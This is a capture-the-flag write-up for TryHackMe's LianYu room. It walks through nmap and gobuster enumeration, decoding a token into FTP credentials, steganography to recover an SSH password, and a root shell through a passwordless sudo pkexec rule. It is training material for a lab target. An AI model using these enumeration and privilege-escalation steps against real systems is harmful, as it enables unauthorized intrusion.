# VA-W6-LianYu-TryHackMeRoom
- Write up for the LianYu machine in TryHackMe
- 
## 🚩 Room Information
- **Target OS:** Linux
- **Difficulty:** Easy
- **Objective:** Capture the User and Root flags through enumeration, steganography, and privilege escalation.
- **Target IP:** 10.48.187.151
---

## 🛠 Tools Used

| Tool | Purpose | Description |
| :--- | :--- | :--- |
| **Nmap** | Scanning | Network mapper used to discover open ports and services. |
| **Gobuster** | Enumeration | A tool used to brute-force URIs (directories/files) on web servers. |
| **FTP Client** | Gaining Access | Used to interact with the File Transfer Protocol service on port 21. |
| **Hexeditor** | Steganography | Used to view and edit the raw bytes (headers) of files. |
| **Steghide** | Steganography | A tool used to hide or extract data from image and audio files. |
| **SSH** | Gaining Access | Secure Shell, used for remote login to the target machine. |

## 0. Prerequisite (LianYu Machine Connection)
- I connected to the TryHackMe network with the VPN configuration downloaded on their website straight into KaliLinux
- I started the machine in the LianYu Room and ran the command `sudo openvpn tryhackme.ovpn` in KaliLinux
- I verified I was connected with `ip addr` to see the ``tun0`` interface

<img width="321" height="325" alt="image" src="https://github.com/user-attachments/assets/c6087bee-f28d-4877-b88b-7b6d3ee727b0" />


## 1. Reconnaissance & Scanning
First, we define the target IP and run a comprehensive Nmap scan to identify the attack surface.

```bash
export IP=10.48.187.151
nmap -sC -sV -p initial_scan.txt $IP
```

- Results:
Port 21: FTP (vsftpd 3.0.2)
Port 22: SSH (OpenSSH 6.7p1)
Port 80: HTTP (Apache 2.4.7)

2. Web Enumeration
Visiting the website on Port 80 shows a basic theme. We perform directory brute-forcing to find hidden content.

Directory Discovery
Using the medium.txt wordlist to find the hidden path:

Bash
gobuster dir -u http://$IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 64
Found: /island

Investigating Subdirectories
Checking the source code of /island revealed the codeword "vigilante". We then scan the next layer:

Bash
gobuster dir -u http://$IP/island -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 64
Found: /2100

Finding the Token
Inside /2100, we look for specific file extensions as hinted in the source code:

Bash
gobuster dir -u http://$IP/island/2100 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .ticket -t 64
Found: green_arrow.ticket

Accessing the file reveals a Base58 encoded string: RTy8yhbQDscX.

3. Gaining Access
FTP Extraction
We decode the string (result: password) and use it to log into the FTP service with the username vigilante.

Bash
ftp $IP
# Username: vigilante
# Password: password
binary
mget *
Steganography Analysis
We retrieve three images. Leave_me_alone.png has a corrupt header. We fix it using hexeditor to match the standard PNG signature (89 50 4E 47 0D 0A 1A 0A).

The image reveals the passphrase: password.

Next, we extract hidden data from aa.jpg:

Bash
steghide extract -sf aa.jpg
# Passphrase: password
This gives us ss.zip. Unzipping this reveals a file containing the SSH password for the user slade.

SSH Login
Bash
ssh slade@$IP
4. Privilege Escalation
Once logged in as slade, we check for sudo permissions:

Bash
sudo -l
Observation: Slade can run /usr/bin/pkexec as root without a password.

Exploitation
Using the pkexec binary to spawn a root shell:

Bash
sudo /usr/bin/pkexec /bin/sh
Verification:

Bash
whoami  # Returns root
cat /root/root.txt
